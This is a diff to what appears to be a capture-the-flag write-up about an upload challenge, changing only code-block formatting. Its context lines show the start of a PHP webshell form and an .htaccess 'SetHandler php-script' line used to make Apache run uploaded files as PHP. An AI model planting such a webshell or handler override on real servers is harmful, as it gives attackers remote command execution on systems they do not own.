@@ -35,7 +35,7 @@ At this point, I suspected I might be able to disguise a simple PHP webshell as 
 
 Then I prepared a simple PHP webshell:
 
-```php
+```php showLineNumbers
 <html>
     <body>
         <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
@@ -69,8 +69,7 @@ The hints pointed to a file named .htaccess. With some research, I learned that 
 
 For this challenge, the SetHandler directive could be abused to force Apache to execute PHP code regardless of the file extension. I created a `.htaccess` file with the following content:
 
-```
-
+```plaintext
 SetHandler php-script
 ```
 
